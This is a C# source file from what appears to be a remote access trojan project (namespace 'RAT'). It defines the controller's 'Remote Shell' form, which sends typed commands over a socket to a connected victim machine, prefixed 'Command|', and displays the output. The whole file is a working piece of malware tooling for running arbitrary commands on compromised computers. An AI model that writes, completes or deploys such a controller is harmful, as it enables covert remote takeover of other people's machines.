using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;

namespace RAT
{
    public partial class FrmShell : Form
    {
        public Socket client;
        public FrmShell(Socket ClientSocket)
        {
            client = ClientSocket;
            InitializeComponent();
        }

        public void DisplayResult(String Result, String ClientAddressDetails)
        {
            if (ClientAddressDetails == client.RemoteEndPoint.ToString())
            {
                textBox1.Text = textBox1.Text + Result;
                textBox1.SelectionStart = textBox1.Text.Length;
                textBox1.ScrollToCaret();
            }
        }

        private void FrmShell_Load(object sender, EventArgs e)
        {
            this.Text = "Remote Shell - [" + client.RemoteEndPoint.ToString() + "]";
            client.Send(Encoding.ASCII.GetBytes("Command|cd *"));
        }

        private void textBox2_KeyDown(object sender, KeyEventArgs e)
        {
            if(e.KeyCode == Keys.Enter)
            {
                textBox1.AppendText(textBox2.Text + Environment.NewLine);
                if (textBox2.Text != "")
                {
                    if (textBox2.Text != "cls")
                    {
                        client.Send(Encoding.ASCII.GetBytes("Command|" + textBox2.Text));
                    }
                    else
                    {
                        textBox1.Text = "";
                    }
                    textBox2.Text = "";
                }
            }
        }
    }
}
